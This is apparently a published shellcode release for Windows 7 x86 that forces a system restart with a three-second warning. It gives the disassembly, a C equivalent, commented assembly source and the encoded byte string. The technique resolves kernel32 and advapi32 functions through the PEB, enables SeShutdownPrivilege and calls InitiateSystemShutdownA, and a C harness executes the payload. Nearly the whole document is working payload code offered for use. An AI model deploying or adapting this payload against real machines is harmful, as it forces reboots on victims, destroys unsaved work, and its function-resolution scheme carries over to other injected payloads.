/*
	# Title: Windows x86 InitiateSystemShutdownA() shellcode
	# Date : 18-08-2016
	# Author : Roziul Hasan Khan Shifat
	# Tested on : Windows 7 x86 starter
*/


/*
Disassembly of section .text:

00000000 <_start>:
   0:	31 c9                	xor    %ecx,%ecx
   2:	64 8b 41 30          	mov    %fs:0x30(%ecx),%eax
   6:	8b 40 0c             	mov    0xc(%eax),%eax
   9:	8b 70 14             	mov    0x14(%eax),%esi
   c:	ad                   	lods   %ds:(%esi),%eax
   d:	96                   	xchg   %eax,%esi
   e:	ad                   	lods   %ds:(%esi),%eax
   f:	8b 48 10             	mov    0x10(%eax),%ecx
  12:	8b 59 3c             	mov    0x3c(%ecx),%ebx
  15:	01 cb                	add    %ecx,%ebx
  17:	8b 5b 78             	mov    0x78(%ebx),%ebx
  1a:	01 cb                	add    %ecx,%ebx
  1c:	8b 73 20             	mov    0x20(%ebx),%esi
  1f:	01 ce                	add    %ecx,%esi
  21:	31 d2                	xor    %edx,%edx

00000023 <g>:
  23:	42                   	inc    %edx
  24:	ad                   	lods   %ds:(%esi),%eax
  25:	01 c8                	add    %ecx,%eax
  27:	81 38 47 65 74 50    	cmpl   $0x50746547,(%eax)
  2d:	75 f4                	jne    23 <g>
  2f:	81 78 04 72 6f 63 41 	cmpl   $0x41636f72,0x4(%eax)
  36:	75 eb                	jne    23 <g>
  38:	81 78 08 64 64 72 65 	cmpl   $0x65726464,0x8(%eax)
  3f:	75 e2                	jne    23 <g>
  41:	8b 73 1c             	mov    0x1c(%ebx),%esi
  44:	01 ce                	add    %ecx,%esi
  46:	8b 14 96             	mov    (%esi,%edx,4),%edx
  49:	01 ca                	add    %ecx,%edx
  4b:	89 cf                	mov    %ecx,%edi
  4d:	31 c0                	xor    %eax,%eax
  4f:	50                   	push   %eax
  50:	83 ec 1c             	sub    $0x1c,%esp
  53:	8d 34 24             	lea    (%esp),%esi
  56:	89 16                	mov    %edx,(%esi)
  58:	50                   	push   %eax
  59:	68 6f 6b 65 6e       	push   $0x6e656b6f
  5e:	68 65 73 73 54       	push   $0x54737365
  63:	68 50 72 6f 63       	push   $0x636f7250
  68:	68 4f 70 65 6e       	push   $0x6e65704f
  6d:	8d 04 24             	lea    (%esp),%eax
  70:	50                   	push   %eax
  71:	51                   	push   %ecx
  72:	ff d2                	call   *%edx
  74:	89 46 04             	mov    %eax,0x4(%esi)
  77:	83 c4 10             	add    $0x10,%esp
  7a:	31 c9                	xor    %ecx,%ecx
  7c:	68 73 41 42 42       	push   $0x42424173
  81:	88 4c 24 01          	mov    %cl,0x1(%esp)
  85:	68 6f 63 65 73       	push   $0x7365636f
  8a:	68 6e 74 50 72       	push   $0x7250746e
  8f:	68 75 72 72 65       	push   $0x65727275
  94:	68 47 65 74 43       	push   $0x43746547
  99:	8d 0c 24             	lea    (%esp),%ecx
  9c:	51                   	push   %ecx
  9d:	57                   	push   %edi
  9e:	8b 16                	mov    (%esi),%edx
  a0:	ff d2                	call   *%edx
  a2:	83 c4 14             	add    $0x14,%esp
  a5:	89 46 08             	mov    %eax,0x8(%esi)
  a8:	31 c9                	xor    %ecx,%ecx
  aa:	68 65 73 73 41       	push   $0x41737365
  af:	88 4c 24 03          	mov    %cl,0x3(%esp)
  b3:	68 50 72 6f 63       	push   $0x636f7250
  b8:	68 45 78 69 74       	push   $0x74697845
  bd:	8d 0c 24             	lea    (%esp),%ecx
  c0:	51                   	push   %ecx
  c1:	57                   	push   %edi
  c2:	8b 16                	mov    (%esi),%edx
  c4:	ff d2                	call   *%edx
  c6:	83 c4 0c             	add    $0xc,%esp
  c9:	89 46 0c             	mov    %eax,0xc(%esi)
  cc:	31 c9                	xor    %ecx,%ecx
  ce:	51                   	push   %ecx
  cf:	68 61 72 79 41       	push   $0x41797261
  d4:	68 4c 69 62 72       	push   $0x7262694c
  d9:	68 4c 6f 61 64       	push   $0x64616f4c
  de:	8d 0c 24             	lea    (%esp),%ecx
  e1:	51                   	push   %ecx
  e2:	57                   	push   %edi
  e3:	8b 16                	mov    (%esi),%edx
  e5:	ff d2                	call   *%edx
  e7:	83 c4 0c             	add    $0xc,%esp
  ea:	68 2e 64 6c 6c       	push   $0x6c6c642e
  ef:	68 70 69 33 32       	push   $0x32336970
  f4:	68 61 64 76 61       	push   $0x61766461
  f9:	8d 0c 24             	lea    (%esp),%ecx
  fc:	51                   	push   %ecx
  fd:	ff d0                	call   *%eax
  ff:	83 c4 0c             	add    $0xc,%esp
 102:	89 c7                	mov    %eax,%edi
 104:	31 c9                	xor    %ecx,%ecx
 106:	68 41 42 42 42       	push   $0x42424241
 10b:	88 4c 24 01          	mov    %cl,0x1(%esp)
 10f:	68 61 6c 75 65       	push   $0x65756c61
 114:	68 65 67 65 56       	push   $0x56656765
 119:	68 69 76 69 6c       	push   $0x6c697669
 11e:	68 75 70 50 72       	push   $0x72507075
 123:	68 4c 6f 6f 6b       	push   $0x6b6f6f4c
 128:	8d 0c 24             	lea    (%esp),%ecx
 12b:	51                   	push   %ecx
 12c:	50                   	push   %eax
 12d:	8b 16                	mov    (%esi),%edx
 12f:	ff d2                	call   *%edx
 131:	83 c4 18             	add    $0x18,%esp
 134:	89 46 10             	mov    %eax,0x10(%esi)
 137:	31 c9                	xor    %ecx,%ecx
 139:	68 73 41 41 41       	push   $0x41414173
 13e:	88 4c 24 01          	mov    %cl,0x1(%esp)
 142:	68 6c 65 67 65       	push   $0x6567656c
 147:	68 72 69 76 69       	push   $0x69766972
 14c:	68 6b 65 6e 50       	push   $0x506e656b
 151:	68 73 74 54 6f       	push   $0x6f547473
 156:	68 41 64 6a 75       	push   $0x756a6441
 15b:	8d 0c 24             	lea    (%esp),%ecx
 15e:	51                   	push   %ecx
 15f:	57                   	push   %edi
 160:	8b 16                	mov    (%esi),%edx
 162:	ff d2                	call   *%edx
 164:	83 c4 18             	add    $0x18,%esp
 167:	89 46 14             	mov    %eax,0x14(%esi)
 16a:	31 c9                	xor    %ecx,%ecx
 16c:	68 77 6e 41 42       	push   $0x42416e77
 171:	88 4c 24 03          	mov    %cl,0x3(%esp)
 175:	68 75 74 64 6f       	push   $0x6f647475
 17a:	68 65 6d 53 68       	push   $0x68536d65
 17f:	68 53 79 73 74       	push   $0x74737953
 184:	68 69 61 74 65       	push   $0x65746169
 189:	68 49 6e 69 74       	push   $0x74696e49
 18e:	8d 0c 24             	lea    (%esp),%ecx
 191:	51                   	push   %ecx
 192:	57                   	push   %edi
 193:	8b 16                	mov    (%esi),%edx
 195:	ff d2                	call   *%edx
 197:	83 c4 18             	add    $0x18,%esp
 19a:	89 46 18             	mov    %eax,0x18(%esi)
 19d:	31 c0                	xor    %eax,%eax
 19f:	50                   	push   %eax
 1a0:	83 ec 14             	sub    $0x14,%esp
 1a3:	8d 3c 24             	lea    (%esp),%edi

000001a6 <proc_start>:
 1a6:	8b 46 08             	mov    0x8(%esi),%eax
 1a9:	ff d0                	call   *%eax
 1ab:	31 d2                	xor    %edx,%edx
 1ad:	8d 17                	lea    (%edi),%edx
 1af:	52                   	push   %edx
 1b0:	31 c9                	xor    %ecx,%ecx
 1b2:	b1 28                	mov    $0x28,%cl
 1b4:	51                   	push   %ecx
 1b5:	50                   	push   %eax
 1b6:	8b 4e 04             	mov    0x4(%esi),%ecx
 1b9:	ff d1                	call   *%ecx
 1bb:	8d 57 04             	lea    0x4(%edi),%edx
 1be:	8d 52 04             	lea    0x4(%edx),%edx
 1c1:	8d 12                	lea    (%edx),%edx
 1c3:	31 c9                	xor    %ecx,%ecx
 1c5:	68 65 67 65 41       	push   $0x41656765
 1ca:	88 4c 24 03          	mov    %cl,0x3(%esp)
 1ce:	68 69 76 69 6c       	push   $0x6c697669
 1d3:	68 77 6e 50 72       	push   $0x72506e77
 1d8:	68 75 74 64 6f       	push   $0x6f647475
 1dd:	68 53 65 53 68       	push   $0x68536553
 1e2:	8d 0c 24             	lea    (%esp),%ecx
 1e5:	31 db                	xor    %ebx,%ebx
 1e7:	52                   	push   %edx
 1e8:	51                   	push   %ecx
 1e9:	53                   	push   %ebx
 1ea:	8b 5e 10             	mov    0x10(%esi),%ebx
 1ed:	ff d3                	call   *%ebx
 1ef:	8d 57 04             	lea    0x4(%edi),%edx
 1f2:	31 c9                	xor    %ecx,%ecx
 1f4:	41                   	inc    %ecx
 1f5:	89 0a                	mov    %ecx,(%edx)
 1f7:	8d 52 04             	lea    0x4(%edx),%edx
 1fa:	41                   	inc    %ecx
 1fb:	89 4a 08             	mov    %ecx,0x8(%edx)
 1fe:	31 d2                	xor    %edx,%edx
 200:	52                   	push   %edx
 201:	52                   	push   %edx
 202:	52                   	push   %edx
 203:	8d 57 04             	lea    0x4(%edi),%edx
 206:	52                   	push   %edx
 207:	31 d2                	xor    %edx,%edx
 209:	52                   	push   %edx
 20a:	8b 17                	mov    (%edi),%edx
 20c:	52                   	push   %edx
 20d:	8b 56 14             	mov    0x14(%esi),%edx
 210:	ff d2                	call   *%edx
 212:	31 c9                	xor    %ecx,%ecx
 214:	51                   	push   %ecx
 215:	68 6e 64 73 21       	push   $0x2173646e
 21a:	68 73 65 63 6f       	push   $0x6f636573
 21f:	68 41 20 33 20       	push   $0x20332041
 224:	68 6d 2e 45 54       	push   $0x54452e6d
 229:	68 79 73 74 65       	push   $0x65747379
 22e:	68 6e 67 20 53       	push   $0x5320676e
 233:	68 61 72 74 49       	push   $0x49747261
 238:	68 52 65 73 74       	push   $0x74736552
 23d:	8d 1c 24             	lea    (%esp),%ebx
 240:	41                   	inc    %ecx
 241:	51                   	push   %ecx
 242:	31 c9                	xor    %ecx,%ecx
 244:	51                   	push   %ecx
 245:	b1 03                	mov    $0x3,%cl
 247:	51                   	push   %ecx
 248:	53                   	push   %ebx
 249:	31 c9                	xor    %ecx,%ecx
 24b:	51                   	push   %ecx
 24c:	8b 4e 18             	mov    0x18(%esi),%ecx
 24f:	ff d1                	call   *%ecx
 251:	8b 4e 0c             	mov    0xc(%esi),%ecx
 254:	50                   	push   %eax
 255:	ff d1                	call   *%ecx


*/



/*
HANDLE 4 bytes
TOKEN_PRIVILEGES 16 bytes

TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY = 40
LUID_AND_ATTRIBUTES 12 bytes
LUID 8 bytes
SE_SHUTDOWN_NAME = "SeShutdownPrivilege"
SE_PRIVILEGE_ENABLED = 2


required functions:

1.  WINADVAPI WINBOOL WINAPI OpenProcessToken (HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
2.  WINBASEAPI HANDLE WINAPI GetCurrentProcess (VOID);

3.  WINADVAPI WINBOOL WINAPI LookupPrivilegeValueA (LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
4.  WINADVAPI WINBOOL WINAPI AdjustTokenPrivileges (HANDLE TokenHandle, WINBOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
5.  WINADVAPI WINBOOL WINAPI InitiateSystemShutdownA(LPSTR lpMachineName,LPSTR lpMessage,DWORD dwTimeout,WINBOOL bForceAppsClosed,WINBOOL bRebootAfterShutdown);

6.GetProcAddress()
7.ExitProcess()
8.LoadLibraryA() [1 time use]



required dll:

1.kernel32.dll
2.kernel32.dll

3.advapi32.dll
4.advapi32.dll
5.advapi32.dll

6.kernel32.dll
7.kernel32.dll
8.kernel32.dll


required macro and custom data types:


#define ANYSIZE_ARRAY 1


	 typedef struct _TOKEN_PRIVILEGES {
      DWORD PrivilegeCount;
      LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
    } TOKEN_PRIVILEGES,*PTOKEN_PRIVILEGES;


	 typedef struct _LUID_AND_ATTRIBUTES {
      LUID Luid;
      DWORD Attributes;
    } LUID_AND_ATTRIBUTES,*PLUID_AND_ATTRIBUTES;
    typedef LUID_AND_ATTRIBUTES LUID_AND_ATTRIBUTES_ARRAY[ANYSIZE_ARRAY];
    typedef LUID_AND_ATTRIBUTES_ARRAY *PLUID_AND_ATTRIBUTES_ARRAY;



	 typedef struct _LUID {
    DWORD LowPart;
    LONG HighPart;
  } LUID,*PLUID;


c code:


#include <windows.h>
#include<stdio.h>
#include<process.h>
#include<io.h>

int main(){
	HANDLE h;
	TOKEN_PRIVILEGES t;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&h))
	return 0;




	LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&t.Privileges[0].Luid);
	t.PrivilegeCount=1;
	t.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;



	AdjustTokenPrivileges(h, FALSE, &t, 0,NULL, 0);

	InitiateSystemShutdown(NULL,"shutting",10,FALSE,1);
}
*/

/*
section .text
	global _start
_start:

xor ecx,ecx

mov eax,[fs:ecx+0x30] ;PEB
mov eax,[eax+0xc] ;PEB->Ldr
mov esi,[eax+0x14] ;PEB->ldr.InMemOrderModuleList
lodsd
xchg esi,eax
lodsd
mov ecx,[eax+0x10] ;kernel32.dll base address


mov ebx,[ecx+0x3c] ;DOS->elf_anew
add ebx,ecx ;PE HEADER
mov ebx,[ebx+0x78] ;DataDirectory->VirtualAddress
add ebx,ecx ;IMAGE_EXPORT_DIRECTORY


mov esi,[ebx+0x20] ;AddressOfNames
add esi,ecx

xor edx,edx

g:
inc edx
lodsd
add eax,ecx
cmp dword [eax],'GetP'
jnz g
cmp dword [eax+4],'rocA'
jnz g
cmp dword [eax+8],'ddre'
jnz g


mov esi,[ebx+0x1c] ;AddressOfFunctions
add esi,ecx

mov edx,[esi+edx*4]
add edx,ecx ;GetProcAddress()

mov edi,ecx ;kernel32.dll

xor eax,eax
push eax
sub esp,28

lea esi,[esp]

mov [esi],dword edx ;GetProcAddress() at offset 0


;---------------------------------
;finding address of OpenProcessToken()

push eax
push 0x6e656b6f
push 0x54737365
push 0x636f7250
push 0x6e65704f

lea eax,[esp]
push eax
push ecx

call edx
;-----------------------------------
mov [esi+4],dword eax ;OpenProcessToken() at offset 4
add esp,0x10
;-------------------------

;finding address of GetCurrentProcess()
xor ecx,ecx
push 0x42424173
mov [esp+1],byte cl
push 0x7365636f
push 0x7250746e
push 0x65727275
push 0x43746547


lea ecx,[esp]
push ecx
push edi

mov edx,dword [esi]
call edx
;-------------------------
add esp,20
mov [esi+8],dword eax ;GetCurrentProcess() at offset 8
;----------------------------------

;finding address of ExitProcess()
xor ecx,ecx
push 0x41737365
mov [esp+3],byte cl
push 0x636f7250
push 0x74697845

lea ecx,[esp]

push ecx
push edi
mov edx,dword [esi]
call edx
;-----------------------
add esp,12
mov [esi+12],dword eax ;ExitProcess() at offset 12
;-------------------------------------------

;finding address of LoadLibraryA()
xor ecx,ecx
push ecx
push 0x41797261
push 0x7262694c
push 0x64616f4c

lea ecx,[esp]
push ecx
push edi

mov edx,dword [esi]
call edx
;--------------------
add esp,12

;LoadLibraryA("advapi32.dll")
push 0x6c6c642e
push 0x32336970
push 0x61766461

lea ecx,[esp]
push ecx
call eax
;--------------------------
add esp,12
mov edi,eax ; advapi32.dll
;------------------------------
;finding address of LookupPrivilegeValueA()
xor ecx,ecx
push 0x42424241
mov [esp+1],byte cl
push 0x65756c61
push 0x56656765
push 0x6c697669
push 0x72507075
push 0x6b6f6f4c


lea ecx,[esp]
push ecx
push eax

mov edx,dword [esi]
call edx

;---------------------------
add esp,0x18
mov [esi+16],dword eax ;LookupPrivilegeValueA() at offset 16
;-------------------------

;finding address of AdjustTokenPrivileges()
xor ecx,ecx
push 0x41414173
mov [esp+1],byte cl
push 0x6567656c
push 0x69766972
push 0x506e656b
push 0x6f547473
push 0x756a6441

lea ecx,[esp]
push ecx
push edi

mov edx,dword [esi]
call edx
;------------------------------------
add esp,0x18
mov [esi+20],dword eax ;AdjustTokenPrivileges() at offset 20
;---------------------------

;finding address of InitiateSystemShutdownA()

xor ecx,ecx
push 0x42416e77
mov [esp+3],byte cl
push 0x6f647475
push 0x68536d65
push 0x74737953
push 0x65746169
push 0x74696e49


lea ecx,[esp]
push ecx
push edi

mov edx,dword [esi]
call edx
;-------------------------
add esp,0x18
mov [esi+24],dword eax ;InitiateSystemShutdownA() at offset 24
;-------------------------

xor eax,eax
push eax


sub esp,20
lea edi,[esp] ;HANDLE+TOKEN_PRIVILEGES address


;---------------------------------
;GetProcAddress() at offset 0
;OpenProcessToken() at offset 4
;GetCurrentProcess() at offset 8
;ExitProcess() at offset 12
;LookupPrivilegeValueA() at offset 16
;AdjustTokenPrivileges() at offset 20
;InitiateSystemShutdownA() at offset 24

;----------------------------------------



proc_start:

;---------------------------
;GetCurrentProcess()

mov eax,[esi+8]
call eax

;----------------------------
;OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&HANDLE)

xor edx,edx
lea edx,[edi]
push edx
xor ecx,ecx
mov cl,40

push ecx
push eax

mov ecx,[esi+4]
call ecx

;--------------------------
;LookupPrivilegeValueA(NULL,SE_SHUTDOWN_NAME,&TOKEN_PRIVILEGES.Privileges[0].Luid);

lea edx,[edi+4]
lea edx,[edx+4]


lea edx,[edx]

xor ecx,ecx

push 0x41656765
mov [esp+3],byte cl
push 0x6c697669
push 0x72506e77
push 0x6f647475
push 0x68536553

lea ecx,[esp]


xor ebx,ebx


push edx
push ecx
push ebx

mov ebx,[esi+16]
call ebx
;----------------------------------
;AdjustTokenPrivileges(HANDLE, FALSE, &TOKEN_PRIVILEGES, 0,NULL, 0);
lea edx,[edi+4]
xor ecx,ecx
inc ecx
mov [edx],dword ecx
lea edx,[edx+4]
inc ecx
mov [edx+8],dword ecx

xor edx,edx
push edx
push edx
push edx

lea edx,[edi+4]
push edx

xor edx,edx
push edx

mov edx,dword [edi]

push edx

mov edx,[esi+20]
call edx

;----------------------------
;InitiateSystemShutdownA(NULL,"RestartIng System.ETA 3 seconds!",3,FALSE,1);

xor ecx,ecx


;--------------------------
push ecx
push 0x2173646e
push 0x6f636573
push 0x20332041
push 0x54452e6d
push 0x65747379
push 0x5320676e
push 0x49747261
push 0x74736552


lea ebx,[esp] ;Message "RestartIng System.ETA 3 seconds!"
;------------------------------

inc ecx ;if U want to shutdown system , just remove this line

push ecx

xor ecx,ecx
push ecx

mov cl,3 ;3 seconds
push ecx
push ebx
xor ecx,ecx
push ecx


mov ecx,[esi+24]
call ecx

;--------------------------
;Exiting
mov ecx,[esi+12]
push eax
call ecx
*/


#include<stdio.h>
#include<string.h>
char shellcode[]=\

"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x89\xcf\x31\xc0\x50\x83\xec\x1c\x8d\x34\x24\x89\x16\x50\x68\x6f\x6b\x65\x6e\x68\x65\x73\x73\x54\x68\x50\x72\x6f\x63\x68\x4f\x70\x65\x6e\x8d\x04\x24\x50\x51\xff\xd2\x89\x46\x04\x83\xc4\x10\x31\xc9\x68\x73\x41\x42\x42\x88\x4c\x24\x01\x68\x6f\x63\x65\x73\x68\x6e\x74\x50\x72\x68\x75\x72\x72\x65\x68\x47\x65\x74\x43\x8d\x0c\x24\x51\x57\x8b\x16\xff\xd2\x83\xc4\x14\x89\x46\x08\x31\xc9\x68\x65\x73\x73\x41\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x0c\x24\x51\x57\x8b\x16\xff\xd2\x83\xc4\x0c\x89\x46\x0c\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x8d\x0c\x24\x51\x57\x8b\x16\xff\xd2\x83\xc4\x0c\x68\x2e\x64\x6c\x6c\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x8d\x0c\x24\x51\xff\xd0\x83\xc4\x0c\x89\xc7\x31\xc9\x68\x41\x42\x42\x42\x88\x4c\x24\x01\x68\x61\x6c\x75\x65\x68\x65\x67\x65\x56\x68\x69\x76\x69\x6c\x68\x75\x70\x50\x72\x68\x4c\x6f\x6f\x6b\x8d\x0c\x24\x51\x50\x8b\x16\xff\xd2\x83\xc4\x18\x89\x46\x10\x31\xc9\x68\x73\x41\x41\x41\x88\x4c\x24\x01\x68\x6c\x65\x67\x65\x68\x72\x69\x76\x69\x68\x6b\x65\x6e\x50\x68\x73\x74\x54\x6f\x68\x41\x64\x6a\x75\x8d\x0c\x24\x51\x57\x8b\x16\xff\xd2\x83\xc4\x18\x89\x46\x14\x31\xc9\x68\x77\x6e\x41\x42\x88\x4c\x24\x03\x68\x75\x74\x64\x6f\x68\x65\x6d\x53\x68\x68\x53\x79\x73\x74\x68\x69\x61\x74\x65\x68\x49\x6e\x69\x74\x8d\x0c\x24\x51\x57\x8b\x16\xff\xd2\x83\xc4\x18\x89\x46\x18\x31\xc0\x50\x83\xec\x14\x8d\x3c\x24\x8b\x46\x08\xff\xd0\x31\xd2\x8d\x17\x52\x31\xc9\xb1\x28\x51\x50\x8b\x4e\x04\xff\xd1\x8d\x57\x04\x8d\x52\x04\x8d\x12\x31\xc9\x68\x65\x67\x65\x41\x88\x4c\x24\x03\x68\x69\x76\x69\x6c\x68\x77\x6e\x50\x72\x68\x75\x74\x64\x6f\x68\x53\x65\x53\x68\x8d\x0c\x24\x31\xdb\x52\x51\x53\x8b\x5e\x10\xff\xd3\x8d\x57\x04\x31\xc9\x41\x89\x0a\x8d\x52\x04\x41\x89\x4a\x08\x31\xd2\x52\x52\x52\x8d\x57\x04\x52\x31\xd2\x52\x8b\x17\x52\x8b\x56\x14\xff\xd2\x31\xc9\x51\x68\x6e\x64\x73\x21\x68\x73\x65\x63\x6f\x68\x41\x20\x33\x20\x68\x6d\x2e\x45\x54\x68\x79\x73\x74\x65\x68\x6e\x67\x20\x53\x68\x61\x72\x74\x49\x68\x52\x65\x73\x74\x8d\x1c\x24\x41\x51\x31\xc9\x51\xb1\x03\x51\x53\x31\xc9\x51\x8b\x4e\x18\xff\xd1\x8b\x4e\x0c\x50\xff\xd1";

main()
{
printf("shellcode lenght %ld\n",(long)strlen(shellcode));
(* (int(*)()) shellcode) ();
}